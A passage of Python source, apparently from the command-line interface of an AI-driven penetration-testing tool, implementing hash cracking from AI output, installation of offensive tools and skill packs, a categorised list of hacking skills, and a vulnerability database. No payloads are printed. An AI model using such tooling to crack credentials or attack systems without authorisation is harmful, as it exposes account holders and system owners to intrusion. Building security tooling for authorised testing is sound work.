                    f"{h_safe[:30]}... → [bold]{result.plaintext}[/bold][/]"
                )
                pending.remove(h)
            elif result.error == "bcrypt_no_online":
                self.console.print(
                    f"  [{THEME['warn']}]{self.s['hash_bcrypt_no_online']}[/]"
                )
            else:
                self.console.print(
                    f"  [{THEME['dim']}]{self.s['hash_online_not_found']}[/]"
                )

        # ── Step 2: 오프라인 크랙 ────────────────────────────────────
        if pending and not self._stop_crack_flag.is_set():
            self.console.print(
                f"[{THEME['secondary']}]  {self.s['hash_offline'].format(n=len(pending))}[/]"
            )
            cracker = HashCracker(on_progress=log)

            for h in list(pending):
                if self._stop_crack_flag.is_set():
                    self.console.print(f"[{THEME['warn']}]{self.s['hash_stopped']}[/]")
                    break
                result = cracker.crack(h)
                if result.cracked and result.plaintext:
                    cracked[h] = result.plaintext
                    self.console.print(
                        f"  [{THEME['success']}]{self.s['hash_offline_ok'].format(method=result.method, h=h[:30], plain=result.plaintext)}[/]"
                    )
                    pending.remove(h)
                else:
                    err = result.error or self.s["hash_manual_unsolved"]
                    self.console.print(
                        f"  [{THEME['dim']}]{self.s['hash_offline_fail'].format(h=h[:30], err=err)}[/]"
                    )

        # ── 결과 테이블 ──────────────────────────────────────────────
        if self._stop_crack_flag.is_set() and not cracked:
            return

        table = RichTable(
            title=f"[{THEME['primary']}]{self.s['hash_result_title']}[/]",
            border_style=THEME["primary"],
        )
        table.add_column(self.s["hash_col_hash"], style=THEME["dim"])
        table.add_column(self.s["hash_col_plain"], style=f"bold {THEME['error']}")
        table.add_column(self.s["hash_col_method"], style=THEME["dim"])

        for h in hashes:
            # Rich 마크업 * 이스케이프 처리
            h_display = h.replace("[", r"\[").replace("*", r"\*")
            if h in cracked:
                table.add_row(h_display, cracked[h], "✓")
            else:
                disp = h_display[:40] + ("..." if len(h) > 40 else "")
                table.add_row(disp, f"[dim]{self.s['hash_unsolved']}[/dim]", "✗")

        self.console.print(table)

        # 세션 로그에 저장
        if cracked:
            _lang_log = getattr(self.config, "lang", "en")
            _hdr = {
                "ko": "## 🔓 자동 크랙 결과\n",
                "zh": "## 🔓 自动破解结果\n",
                "en": "## 🔓 Auto-crack results\n",
            }.get(_lang_log, "## 🔓 Auto-crack results\n")
            lines = [_hdr]
            for h, p in cracked.items():
                lines.append(f"- `{h}` → **{p}**\n")
            self._append_to_session_log("assistant", "".join(lines))

        self.console.print(
            f"[{THEME['dim']}]{self.s['hash_done']}[/]"
        )

    def _cmd_crack(self, arg: str = "") -> None:
        """
        /crack <hash>          — 단일 해시 크랙
        /crack                 — 최근 AI 응답에서 해시 자동 추출 후 크랙
        /crack --wordlist /path/to/list.txt <hash>
        """
        from ..tools.hash_crack import HashCracker, extract_hashes_from_text, detect_hash_type
        from rich.table import Table as RichTable

        wordlist = None
        hashes: list[str] = []

        # 인자 파싱
        tokens = arg.split()
        i = 0
        while i < len(tokens):
            if tokens[i] in ("--wordlist", "-w") and i + 1 < len(tokens):
                wordlist = tokens[i + 1]
                i += 2
            else:
                hashes.append(tokens[i])
                i += 1

        # 인자 없으면 최근 AI 응답에서 자동 추출
        if not hashes:
            last_ai = next(
                (m.content for m in reversed(self.history) if m.role == "assistant"),
                None,
            )
            if last_ai:
                hashes = extract_hashes_from_text(last_ai)

        if not hashes:
            self.console.print(
                f"[{THEME['warn']}]{self.s['hash_none']}[/]\n"
                f"[{THEME['dim']}]{self.s['hash_usage']}[/]"
            )
            return

        self.console.print(
            f"\n[{THEME['warn']}]{self.s['hash_start'].format(n=len(hashes))}[/]\n"
        )
        self._stop_crack_flag.clear()
        # 워드리스트 지정 시 HashCracker에 직접 전달해 실행 (동기)
        if wordlist:
            from ..tools.hash_crack import HashCracker
            cracker = HashCracker(
                wordlist=wordlist,
                on_progress=lambda m: self.console.print(f"[{THEME['dim']}]{m}[/]"),
            )
            for h in hashes:
                if self._stop_crack_flag.is_set():
                    break
                r = cracker.crack(h)
                if r.cracked:
                    self.console.print(
                        f"  [{THEME['success']}]✓ {h[:30]}... → [bold]{r.plaintext}[/bold][/]"
                    )
                else:
                    self.console.print(f"  [{THEME['dim']}]✗ {h[:30]}... {self.s['hash_manual_unsolved']}[/]")
        else:
            # 파이프라인 (온라인 → 오프라인)
            self._auto_crack_pipeline(hashes)

    # ── /install exe-deps (Playwright style) ─────────────────────────────
    def _cmd_install_exe_deps(self) -> None:
        """
        Playwright-style EXE dependency installer.
        Shows status of each dep, installs missing ones.
        """
        from ..tools.exe_analyzer import (  # noqa: PLC0415
            ensure_exe_deps, _load_optional_deps, _DEPS_CHECKED,
        )
        import bingo.tools.exe_analyzer as _exe_mod  # noqa: PLC0415

        self.console.print()
        self.console.print(
            f"[{THEME['success']}]  bingo — EXE Phase 0 Dependencies[/]"
        )
        self.console.print()

        # Force re-check so status is always shown fresh
        _exe_mod._DEPS_CHECKED = False
        result = ensure_exe_deps(silent=True)   # we print our own rich output below
        _load_optional_deps()

        labels = {
            "pefile":   ("pefile",       "PE header parsing",       True),
            "lief":     ("lief",         "PE/ELF/Mach-O rich API",  False),
            "yara":     ("yara-python",  "YARA rule scanning",      False),
            "ssdeep":   ("ssdeep",       "Fuzzy hashing (ssdeep)",  False),
            "requests": ("requests",     "VirusTotal lookup",       False),
        }
        for import_name, (pip_name, desc, required) in labels.items():
            ok = result.get(import_name, False)
            tag = "" if required else f"  [{THEME['dim']}](optional)[/]"
            if ok:
                icon = f"[{THEME['success']}]✅  already installed[/]"
            else:
                icon = f"[{THEME['warn']}]📦  installed now    [/]"
            self.console.print(
                f"    {icon}  [white]{pip_name:<18}[/] [{THEME['dim']}]{desc}[/]{tag}"
            )

        self.console.print()
        all_ready = all(result.values())
        if all_ready:
            self.console.print(
                f"[{THEME['success']}]  ✅  All EXE Phase 0 dependencies are ready![/]\n"
            )
        else:
            missing = [
                labels[k][0] for k, v in result.items() if not v and k in labels
            ]
            self.console.print(
                f"[{THEME['warn']}]  ⚠   Some dependencies could not be installed:[/]"
            )
            for m in missing:
                self.console.print(f"      pip install {m}")
            self.console.print()

    def _cmd_tools(self, arg: str = "") -> None:
        from ..tools.registry import ToolRegistry
        from ..tools.executor import _GO_TOOLS, _PKG_TOOLS

        # ── /tools install <name|all> ────────────────────────────────
        tokens = arg.split()
        if tokens and tokens[0].lower() in ("install", "add"):
            targets = tokens[1:] if len(tokens) > 1 else []
            if not targets:
                self._warn(self.s["tools_usage_hint"])
                return
            if targets == ["all"]:
                missing = [t.name for t in ToolRegistry.missing_tools()]
                targets = missing

            self.console.print(f"\n[{THEME['warn']}]{self.s['tools_auto_install']}: {', '.join(targets)}[/]\n")
            for tool_name in targets:
                self._install_tool_interactive(tool_name)
            return

        # ── 도구 현황 테이블 ────────────────────────────────────────
        self.console.print()
        all_tools = ToolRegistry.scan_all()
        available_cnt = sum(1 for i in all_tools.values() if i.available)
        missing_list = [(n, i) for n, i in all_tools.items() if not i.available]

        table = Table(
            title=f"[{THEME['primary']}]{self.s['tools_title'].format(a=available_cnt, t=len(all_tools))}[/]",
            border_style=THEME["primary"],
        )
        table.add_column("#", style=THEME["dim"], width=3)
        table.add_column(self.s["tools_col_tool"], style=THEME["secondary"])
        table.add_column(self.s["tools_col_type"], style=THEME["dim"])
        table.add_column(self.s["tools_col_status"], justify="center")
        table.add_column(self.s["tools_col_version"], style=THEME["dim"])

        _type_label = {
            **{t: "Go Binary" for t in _GO_TOOLS},
            **{t: "pkg-mgr" for t in _PKG_TOOLS},
            "sqlmap": "Python", "wafw00f": "Python",
            "curl": "builtin", "python3": "builtin",
        }

        for i, (name, info) in enumerate(all_tools.items(), 1):
            typ = _type_label.get(name, "tool")
            if info.available:
                table.add_row(
                    str(i), name, typ,
                    f"[{THEME['success']}]✓[/]",
                    (info.version or self.s["tools_installed"])[:55],
                )
            else:
                table.add_row(
                    str(i), name, typ,
                    f"[{THEME['error']}]✗[/]",
                    info.install_hint[:55],
                )
        self.console.print(table)

        # ── 없는 도구가 있으면 자동 설치 제안 ──────────────────────
        if not missing_list:
            self.console.print(
                f"[{THEME['success']}]{self.s['tools_all_ok']}[/]\n"
            )
            return

        self.console.print(
            f"\n[{THEME['warn']}]{self.s['tools_missing'].format(n=len(missing_list))}[/]"
        )
        for i, (n, _) in enumerate(missing_list, 1):
            typ = _type_label.get(n, "tool")
            method = "GitHub Releases" if n in _GO_TOOLS else "brew/apt/pip"
            self.console.print(
                f"  [{THEME['secondary']}]{i}[/] — [{THEME['primary']}]{n}[/]"
                f"  [{THEME['dim']}]({typ}, {method})[/]"
            )
        self.console.print(
            f"\n  [{THEME['dim']}]{self.s['tools_install_hint']}[/]\n"
        )

        # 바로 설치할지 물어보기
        try:
            ans = self._session.prompt(
                HTML(f'<ansiyellow>{self.s["tools_install_all_ask"]} </ansiyellow>'),
                style=PT_STYLE,
            ).strip().lower()
        except (KeyboardInterrupt, EOFError):
            return

        if ans in ("y", "yes", "예", "是", "是的"):
            self.console.print(
                f"\n[{THEME['warn']}]{self.s['tools_install_start'].format(n=len(missing_list))}[/]\n"
            )
            for name, _ in missing_list:
                self._install_tool_interactive(name)
        else:
            self.console.print(
                f"[{THEME['dim']}]{self.s['tools_install_later']}[/]"
            )

    def _install_tool_interactive(self, tool_name: str) -> None:
        """단일 도구 자동 설치 with 진행 상황 출력"""
        from ..tools.registry import ToolRegistry, _find_binary
        from ..tools.executor import _GO_TOOLS, _PKG_TOOLS
        import shutil

        self.console.print(
            f"[{THEME['secondary']}]  ▸ {tool_name}[/] {self.s['install_trying']}",
            end=" "
        )
        log_lines: list[str] = []

        def log(msg: str) -> None:
            log_lines.append(msg)
            self.console.print(f"\n    [{THEME['dim']}]{msg}[/]", end="")

        success = False

        try:
            if tool_name in _GO_TOOLS:
                from ..tools.downloader import download_tool
                path = download_tool(tool_name, log)
                success = path is not None and path.exists()
            elif tool_name in _PKG_TOOLS:
                from ..tools.installer import install_tool
                success = install_tool(tool_name, log)
            elif tool_name in ("sqlmap", "wafw00f"):
                from ..tools.installer import install_tool
                success = install_tool(tool_name, log)
        except Exception as e:
            log(f"{self.s['install_error']}: {e}")

        if success:
            ToolRegistry._cache.pop(tool_name, None)
            self.console.print(f"\n  [{THEME['success']}]{self.s['tools_install_ok'].format(name=tool_name)}[/]")
        else:
            self.console.print(f"\n  [{THEME['error']}]{self.s['tools_install_fail'].format(name=tool_name)}[/]")

    def _cmd_skill_install(self, source: str) -> None:
        """
        스킬 설치:
          /skill install https://github.com/user/repo   → git clone
          /skill install /path/to/local/skill           → 로컬 폴더 복사
          /skill install <preset>                       → 내장 프리셋
        """
        import shutil, subprocess, tempfile
        from pathlib import Path

        skills_dir = Path(__file__).parent.parent / "skills" / "local_skills"
        skills_dir.mkdir(parents=True, exist_ok=True)

        self.console.print(f"\n[{THEME['warn']}]{self.s.get('skill_install_start', '📦 Installing skill: {source}').format(source=source)}[/]")

        # ── GitHub URL ────────────────────────────────────────────
        if source.startswith("http"):
            repo_name = source.rstrip("/").split("/")[-1].replace(".git", "")
            dst = skills_dir / repo_name
            if dst.exists():
                self.console.print(f"[{THEME['warn']}]  {self.s.get('skill_already_installed', 'Already installed: {name}').format(name=repo_name)}[/]")
                return
            with self.console.status(f"[{THEME['dim']}]git clone...[/]"):
                try:
                    result = subprocess.run(
                        ["git", "clone", "--depth=1", source, str(dst)],
                        capture_output=True, text=True, timeout=60
                    )
                    if result.returncode == 0:
                        self.console.print(f"[{THEME['success']}]  {self.s.get('skill_install_ok', '✔ {name} installed → {dst}').format(name=repo_name, dst=dst)}[/]")
                    else:
                        self.console.print(f"[{THEME['error']}]  {self.s.get('skill_clone_fail', 'git clone failed: {err}').format(err=result.stderr[:200])}[/]")
                        return
                except Exception as e:
                    self.console.print(f"[{THEME['error']}]  {self.s.get('skill_install_err', 'Error: {err}').format(err=e)}[/]")
                    return

        # ── 로컬 경로 ─────────────────────────────────────────────
        elif source.startswith("/") or source.startswith("~") or source.startswith("."):
            src_path = Path(source).expanduser().resolve()
            if not src_path.exists():
                self.console.print(f"[{THEME['error']}]  {self.s.get('skill_path_notfound', 'Path not found: {path}').format(path=src_path)}[/]")
                return
            dst = skills_dir / src_path.name
            if dst.exists():
                self.console.print(f"[{THEME['warn']}]  {self.s.get('skill_updating', 'Already installed: {name} — updating...').format(name=src_path.name)}[/]")
                shutil.rmtree(dst)
            shutil.copytree(str(src_path), str(dst))
            self.console.print(f"[{THEME['success']}]  {self.s.get('skill_install_ok_local', '✔ {name} installed').format(name=src_path.name)}[/]")

        else:
            self.console.print(f"[{THEME['error']}]  {self.s.get('skill_install_usage', 'Usage:')}[/]")
            self.console.print(f"[{THEME['dim']}]  /skill install https://github.com/user/skill-repo[/]")
            self.console.print(f"[{THEME['dim']}]  /skill install /path/to/local/skill[/]")
            return

        # 설치 후 스킬 목록 새로 표시
        from ..skills.engine import SkillEngine
        installed = SkillEngine().list_local_skills()
        self.console.print(f"\n[{THEME['success']}]{self.s.get('skill_installed_count', 'Installed skill packs: {n}').format(n=len(installed))}[/]")
        for sk in installed:
            self.console.print(f"  [{THEME['secondary']}]{sk['name']}[/] — {self.s.get('skill_ref_count', '{n} references').format(n=sk['ref_count'])}")

    def _list_hack_skills(self) -> list[dict]:
        """hack-skills 디렉토리 스캔 → 사용 가능한 스킬 목록 반환."""
        hs_dir = Path(__file__).parent.parent / "skills" / "hack-skills"
        skills = []
        if hs_dir.exists():
            for d in sorted(hs_dir.iterdir()):
                if d.is_dir() and (d / "SKILL.md").exists():
                    lines = len((d / "SKILL.md").read_text(encoding="utf-8").splitlines())
                    skills.append({"name": d.name, "lines": lines})
        return skills

    def _cmd_skill(self, keyword: str = "") -> None:
        from ..skills.engine import SkillEngine
        engine = SkillEngine()

        hack_skills = self._list_hack_skills()

        if keyword:
            # ── hack-skills 키워드 검색 ───────────────────────────────
            kw = keyword.lower()
            hs_matches = [s for s in hack_skills if kw in s["name"].lower()]
            if hs_matches:
                self.console.print(
                    f"\n[{THEME['success']}]⚡ {self.s.get('hackskills_match', 'hack-skills match ({n})').format(n=len(hs_matches))}[/]"
                )
                for s in hs_matches[:15]:
                    self.console.print(
                        f"  [{THEME['secondary']}]{s['name']}[/]  [{THEME['dim']}]{s['lines']} lines[/]"
                    )
                self.console.print(
                    f"\n  [{THEME['dim']}]{self.s.get('hackskills_auto_note', 'AI auto-selects. No manual install needed.')}[/]"
                )

            # ── 로컬 SecSkills references 검색 ────────────────────────
            local_results = engine.local_skill_search(keyword)
            if local_results:
                _ref_title = self.s.get("skill_secskills_ref", "SecSkills References")
                self.console.print(
                    f"\n[{THEME['secondary']}]🔍 {_ref_title}: [bold]{keyword}[/bold][/]"
                )
                ref_table = Table(border_style=THEME["primary"], show_header=True)
                ref_table.add_column(self.s.get("skill_col_pack", "Skill Pack"), style=THEME["secondary"], width=20)
                ref_table.add_column(self.s.get("skill_col_ref", "Reference"), style="white", width=30)
                ref_table.add_column(self.s.get("skill_col_tag", "Keywords"), style=THEME["dim"])
                for r in local_results[:8]:
                    ref_table.add_row(
                        r["skill_dir"],
                        r["reference"] or "SKILL.md",
                        ", ".join(r["matched_keywords"][:3]),
                    )
                self.console.print(ref_table)

            if not hs_matches and not local_results:
                # ── 내장 DB 검색 (마지막 수단) ─────────────────────────
                results = engine.search(keyword)
                if results:
                    for r in results[:8]:
                        self.console.print(f"  [{THEME['primary']}]{r['module']}[/] → {r['skill']}")
                else:
                    self.console.print(
                        f"[{THEME['dim']}]{self.s['skill_no_result'].format(kw=keyword)}[/]"
                    )
        else:
            # ── hack-skills 전체 목록 표시 ─────────────────────────────
            if hack_skills:
                hs_table = Table(
                    title=f"[{THEME['success']}]⚡ {self.s.get('hackskills_all_ready', 'hack-skills — {n} ready').format(n=len(hack_skills))}[/]",
                    border_style=THEME["success"],
                    show_header=True,
                )
                hs_table.add_column(self.s.get("skill_col_name", "Skill Name (SKILL_LOAD)"), style=THEME["secondary"], width=42)
                hs_table.add_column(self.s.get("skill_col_lines", "Lines"), justify="right", style=THEME["dim"], width=7)
                # 카테고리 구분선과 함께 출력
                cat_map = {
                    "injection": "🔴 Web Injection",
                    "sqli": "🔴 Web Injection",
                    "xss": "🔴 Web Injection",
                    "ssti": "🔴 Web Injection",
                    "cmdi": "🔴 Web Injection",
                    "nosql": "🔴 Web Injection",
                    "xxe": "🔴 Web Injection",
                    "expression": "🔴 Web Injection",
                    "jndi": "🔴 Web Injection",
                    "crlf": "🔴 Web Injection",
                    "xslt": "🔴 Web Injection",
                    "csv": "🔴 Web Injection",
                    "email": "🔴 Web Injection",
                    "http-parameter": "🔴 Web Injection",
                    "type-juggling": "🔴 Web Injection",
                    "ssrf": "🟠 Server-Side",
                    "deserializ": "🟠 Server-Side",
                    "request-smuggling": "🟠 Server-Side",
                    "http2": "🟠 Server-Side",
                    "http-host": "🟠 Server-Side",
                    "web-cache": "🟠 Server-Side",
                    "dns-rebin": "🟠 Server-Side",
                    "dangling": "🟠 Server-Side",
                    "arbitrary": "🟠 Server-Side",
                    "csrf": "🟡 Client-Side",
                    "cors": "🟡 Client-Side",
                    "clickjack": "🟡 Client-Side",
                    "open-redirect": "🟡 Client-Side",
                    "csp": "🟡 Client-Side",
                    "prototype": "🟡 Client-Side",
                    "authbypass": "🔵 Auth/Authz",
                    "idor": "🔵 Auth/Authz",
                    "jwt": "🔵 Auth/Authz",
                    "oauth": "🔵 Auth/Authz",
                    "saml": "🔵 Auth/Authz",
                    "401": "🔵 Auth/Authz",
                    "auth-sec": "🔵 Auth/Authz",
                    "upload": "🟣 File/Upload",
                    "path-traversal": "🟣 File/Upload",
                    "file-access": "🟣 File/Upload",
                    "insecure-source": "🟣 File/Upload",
                    "api": "⚪ API",
                    "graphql": "⚪ API",
                    "business": "⚫ Logic",
                    "race": "⚫ Logic",
                    "hack": "🌐 Recon",
                    "recon": "🌐 Recon",
                    "subdomain": "🌐 Recon",
                    "waf": "🌐 Recon",
                    "linux-priv": "🟤 PrivEsc",
                    "windows-priv": "🟤 PrivEsc",
                    "linux-security": "🟤 PrivEsc",
                    "linux-lateral": "🟤 PrivEsc",
                    "windows-av": "🟤 PrivEsc",
                    "windows-lateral": "🟤 PrivEsc",
                    "reverse-shell": "🟤 PrivEsc",
                    "tunneling": "🟤 PrivEsc",
                    "container": "🏗️ Infra",
                    "kubernetes": "🏗️ Infra",
                    "network-protocol": "🏗️ Infra",
                    "ntlm": "🏗️ Infra",
                    "unauthorized": "🏗️ Infra",
                    "active-directory": "🏛️ Active Directory",
                    "android": "📱 Mobile",
                    "ios": "📱 Mobile",
                    "mobile": "📱 Mobile",
                    "hash": "🔐 Crypto",
                    "rsa": "🔐 Crypto",
                    "classical": "🔐 Crypto",
                    "symmetric": "🔐 Crypto",
                    "lattice": "🔐 Crypto",
                    "binary": "💀 Binary/Exploit",
                    "format-string": "💀 Binary/Exploit",
                    "stack-overflow": "💀 Binary/Exploit",
                    "heap": "💀 Binary/Exploit",
                    "kernel": "💀 Binary/Exploit",
                    "browser-exploit": "💀 Binary/Exploit",
                    "sandbox": "💀 Binary/Exploit",
                    "anti-debug": "💀 Binary/Exploit",
                    "ghost": "🆕 Emerging",
                    "llm": "🆕 Emerging",
                    "ai-ml": "🆕 Emerging",
                    "defi": "🆕 Emerging",
                    "smart-contract": "🆕 Emerging",
                    "dependency": "🆕 Emerging",
                    "macos": "🆕 Emerging",
                }
                for s in hack_skills:
                    cat = "🔧 Other"
                    for prefix, c in cat_map.items():
                        if s["name"].lower().startswith(prefix) or prefix in s["name"].lower():
                            cat = c
                            break
                    hs_table.add_row(f"{s['name']}", str(s["lines"]))
                self.console.print(hs_table)
                self.console.print(
                    f"[{THEME['dim']}]  💡 {self.s.get('hackskills_auto_full', 'AI auto-selects. No manual install/activation needed.')}[/]"
                )
                _search_tip = {
                    "ko": "💡 /skill <키워드>  — 특정 스킬 검색",
                    "zh": "💡 /skill <关键词>  — 搜索特定技能",
                    "en": "💡 /skill <keyword>  — search for a specific skill",
                }.get(getattr(self.config, "lang", "en"), "💡 /skill <keyword>  — search for a specific skill")
                self.console.print(f"[{THEME['dim']}]  {_search_tip}[/]\n")

            # ── 로컬 SecSkills 팩 목록 ──────────────────────────────────
            local_skills = engine.list_local_skills()
            if local_skills:
                ls_table = Table(
                    title=f"[{THEME['primary']}]{self.s.get('skill_local_packs', '📦 SecSkills Local Reference Packs')}[/]",
                    border_style=THEME["primary"],
                )
                ls_table.add_column(self.s.get("skill_col_pack", "Skill Pack"), style=THEME["secondary"], width=22)
                ls_table.add_column(self.s.get("skill_col_refs", "Refs"), justify="right", width=10)
                ls_table.add_column(self.s.get("skill_col_main", "Main References"), style=THEME["dim"])
                for ls in local_skills:
                    refs_preview = ", ".join(ls["references"][:4])
                    if len(ls["references"]) > 4:
                        refs_preview += f" +{len(ls['references'])-4}..."
                    ls_table.add_row(ls["name"], str(ls["ref_count"]), refs_preview)
                self.console.print(ls_table)
                self.console.print(
                    f"[{THEME['dim']}]{self.s.get('skill_search_tip', '💡 Use /skill <keyword> to search references')}[/]\n"
                )

            # ── 내장 DB 모듈 목록 ──────────────────────────────────────
            table = Table(
                title=f"[{THEME['primary']}]{self.s['skill_module_title']}[/]",
                border_style=THEME["primary"],
            )
            _lang = getattr(self.config, "lang", "en")
            _col_module = {"ko": "모듈", "zh": "模块", "en": "Module"}.get(_lang, "Module")
            _col_count  = {"ko": "스킬 수", "zh": "技能数", "en": "Skills"}.get(_lang, "Skills")
            table.add_column("ID", style=THEME["secondary"], width=4)
            table.add_column(_col_module, style="white")
            table.add_column(_col_count, justify="right")
            for mod in engine.list_all():
                # 언어별 모듈명: ko > en > zh
                _mod_name = mod.get("ko") or mod.get("en") or mod.get("name", "")
                if _lang == "zh":
                    _mod_name = mod.get("name") or mod.get("en", "")
                elif _lang == "en":
                    _mod_name = mod.get("en") or mod.get("name", "")
                table.add_row(mod["id"], _mod_name, str(len(mod["skills"])))
            self.console.print(table)
            self.console.print(f"[{THEME['dim']}]{self.s['skill_search_hint']}[/]")

            # ── skills_data DB 모듈 목록 ───────────────────────────
            try:
                from ..skills.skills_data import SKILLS_DB
                from ..skills.skills_data2 import SKILLS_DB_2
                from ..skills.skills_data3 import SKILLS_DB_3
                _all_db = {**SKILLS_DB, **SKILLS_DB_2, **SKILLS_DB_3}
                from collections import Counter
                mod_counts: Counter = Counter()
                for sk in _all_db.values():
                    mod_counts[sk.get("module", "Unknown")] += 1
                _db_title = {
                    "ko": f"📚 내장 DB 모듈 — {len(_all_db)}개 스킬 (SKILL_LOAD: <모듈명>)",
                    "zh": f"📚 内置DB模块 — {len(_all_db)}个技能 (SKILL_LOAD: <模块名>)",
                    "en": f"📚 Built-in DB Modules — {len(_all_db)} skills (SKILL_LOAD: <module>)",
                }.get(_lang, f"📚 Built-in DB — {len(_all_db)} skills")
                _col_mod_name = {
                    "ko": "모듈명 (SKILL_LOAD)",
                    "zh": "模块名 (SKILL_LOAD)",
                    "en": "Module Name (SKILL_LOAD)",
                }.get(_lang, "Module Name (SKILL_LOAD)")
                _col_sk_cnt = {"ko": "스킬 수", "zh": "技能数", "en": "Skills"}.get(_lang, "Skills")
                db_table = Table(
                    title=f"[{THEME['primary']}]{_db_title}[/]",
                    border_style=THEME["primary"],
                )
                db_table.add_column(_col_mod_name, style=THEME["secondary"], width=32)
                db_table.add_column(_col_sk_cnt, justify="right", style=THEME["dim"], width=8)
                for mod_name, cnt in sorted(mod_counts.items()):
                    db_table.add_row(mod_name, str(cnt))
                self.console.print(db_table)
                self.console.print(
                    f"[{THEME['dim']}]  {self.s.get('skill_db_load_example', 'e.g. SKILL_LOAD: Exploitation')}[/]\n"
                )
            except Exception:
                pass

    # ── 유틸 ──────────────────────────────────────────────────────
    def _init_session(self) -> None:
        hist_path = Path.home() / ".config" / "bingo" / "history"
        hist_path.parent.mkdir(parents=True, exist_ok=True)
        self._session = PromptSession(
            history=FileHistory(str(hist_path)),
            auto_suggest=AutoSuggestFromHistory(),
            completer=_SlashCompleter(lambda: self.config.lang),
            complete_while_typing=True,
            mouse_support=False,
        )

    def _clear(self) -> None:
        os.system("cls" if os.name == "nt" else "clear")

    def _info(self, msg: str) -> None:
        self.console.print(f"[{THEME['dim']}]  ℹ  {msg}[/]")

    def _warn(self, msg: str) -> None:
        self.console.print(f"[{THEME['warn']}]  ⚠  {msg}[/]")

    def _error(self, msg: str) -> None:
        self.console.print(f"[{THEME['error']}]  ✖  {msg}[/]")

    def _success(self, msg: str) -> None:
        self.console.print(f"[{THEME['success']}]  ✔  {msg}[/]")

    # ══════════════════════════════════════════════════════════════
    # v3.4.0 명령어 핸들러
    # ══════════════════════════════════════════════════════════════

    # ── /role ─────────────────────────────────────────────────────
    def _cmd_role(self, arg: str = "") -> None:
        """/role [list|set <name>|info|clear]  — 역할 기반 테스트 모드"""
        from ..roles.manager import RoleManager
        from rich.table import Table as _T
        rm = RoleManager.instance()   # singleton — 상태 유지
        sub = arg.strip().split(None, 1)
        cmd = sub[0].lower() if sub else "list"
        param = sub[1].strip() if len(sub) > 1 else ""

        if cmd == "list" or not arg.strip():
            roles = rm.list_roles()
            t = _T(title="[bold green]Available Roles[/]", border_style=THEME["primary"])
            t.add_column("Name", style="cyan", width=20)
            t.add_column("Description", overflow="fold")
            for r in roles:
                name_v = r.name if hasattr(r, "name") else str(r)
                desc_v = r.description if hasattr(r, "description") else ""
                t.add_row(name_v, desc_v)
            self.console.print(t)
            active = rm.active()   # 메서드 호출 — 괄호 필수
            if active:
                active_name = active.name if hasattr(active, "name") else str(active)
                self.console.print(f"\n[{THEME['success']}]Active role: {active_name}[/]")
            else:
                self.console.print(f"\n[dim]Active role: none[/]")
        elif cmd == "set":
            if not param:
                self._warn("Usage: /role set <name>")
                return
            result = rm.switch(param)
            if result:
                self._success(f"Role set → {param}")
            else:
                self._error(f"Role '{param}' not found. Use /role list to see available roles.")
        elif cmd == "info":
            active = rm.active()   # 메서드 호출
            name = param or (active.name if active and hasattr(active, "name") else "")
            if not name:
                self._warn("No active role. Use /role set <name> first.")
                return
            role = rm.get(name)
            if role:
                self.console.print(f"[{THEME['primary']}]Role: {name}[/]")
                for k, v in (role.__dict__ if hasattr(role, "__dict__") else {}).items():
                    self.console.print(f"  [dim]{k}:[/] {v}")
            else:
                self._error(f"Role '{name}' not found.")
        elif cmd == "clear":
            rm.clear()
            self._success("Role cleared.")
        else:
            self._warn("Usage: /role [list|set <name>|info|clear]")

    # ── /vulns ────────────────────────────────────────────────────
    def _cmd_vulns(self, arg: str = "") -> None:
        """/vulns [list|add|show <id>|del <id>|export]  — 취약점 DB"""
        from ..vulns.manager import VulnManager
        from rich.table import Table as _T
        vm = VulnManager()
        sub = arg.strip().split(None, 1)
        cmd = sub[0].lower() if sub else "list"
        param = sub[1].strip() if len(sub) > 1 else ""

        if cmd == "list" or not arg.strip():
            vulns = vm.list()  # list_vulns() → list()
            if not vulns:
                self._info("No vulnerabilities recorded yet. Use /vulns add")
                return
            t = _T(title="[bold red]Vulnerability Database[/]", border_style=THEME["primary"], show_lines=True)
            t.add_column("ID", width=8, style="dim")
            t.add_column("Title", width=20, style="red")
            t.add_column("Severity", width=8)
            t.add_column("Target", width=30, overflow="fold")
            t.add_column("Status", width=8)
            for v in vulns:
                sev = (v.severity if hasattr(v, "severity") else "medium").upper()
                sev_color = {"HIGH": "red", "CRITICAL": "bold red", "MEDIUM": "yellow", "LOW": "green"}.get(sev, "white")
                vid = v.id if hasattr(v, "id") else "?"
                title = v.title if hasattr(v, "title") else "?"
                target = v.target if hasattr(v, "target") else ""
                status = v.status if hasattr(v, "status") else ""
                t.add_row(
                    str(vid)[:8], title,
                    f"[{sev_color}]{sev}[/]",
                    target, status
                )
            self.console.print(t)
        elif cmd == "add":
            self.console.print(f"[{THEME['primary']}]New vulnerability entry (Ctrl+C to cancel)[/]")
            try:
                title = self._session.prompt("  Title (e.g. SQLi in login): ").strip()
                severity = self._session.prompt("  Severity [critical/high/medium/low]: ").strip() or "medium"
                target = self._session.prompt("  Target URL/endpoint: ").strip()
                description = self._session.prompt("  Description: ").strip()
                poc = self._session.prompt("  PoC (optional): ").strip()
                vid = vm.add(title=title, severity=severity,  # add() not add_vuln()
                             target=target, description=description, poc=poc)
                self._success(f"Vulnerability recorded: {vid}")
            except (KeyboardInterrupt, EOFError):
                self._info("Cancelled.")
        elif cmd == "show":
            if not param:
                self._warn("Usage: /vulns show <id>")
                return
            v = vm.get(param)  # get() not get_vuln(), accepts str id
            if not v:
                self._error(f"Vuln '{param}' not found.")
                return
            for k, val in (v.__dict__ if hasattr(v, "__dict__") else {}).items():
                self.console.print(f"  [cyan]{k}:[/] {val}")
        elif cmd == "del":
            if not param:
                self._warn("Usage: /vulns del <id>")
                return
            ok = vm.remove(param)  # remove() not delete_vuln()
            if ok:
                self._success(f"Vuln '{param}' deleted.")
            else:
                self._error(f"Vuln '{param}' not found.")
        elif cmd == "export":
            # export_json() 없음 — 직접 JSON 저장
            import json, os
            vulns = vm.list()
            data = [v.__dict__ if hasattr(v, "__dict__") else {} for v in vulns]
            path = os.path.join(str(Path.home() / "Desktop"), "bingo_vulns.json")
            with open(path, "w", encoding="utf-8") as _f:
                json.dump(data, _f, ensure_ascii=False, indent=2)
            self._success(f"Exported {len(data)} vulns → {path}")
        else:
            self._warn("Usage: /vulns [list|add|show <id>|del <id>|export]")

    # ── /board ────────────────────────────────────────────────────
    def _cmd_board(self, arg: str = "") -> None:
        """/board [show|set <k> <v>|del <k>|clear]  — 프로젝트 블랙보드"""
        from ..blackboard.store import Blackboard
        from rich.table import Table as _T
        target = self._agent_state.get("target") or "global"
        bb = Blackboard(target)
        sub = arg.strip().split(None, 2)
        cmd = sub[0].lower() if sub else "show"

        if cmd == "show" or not arg.strip():
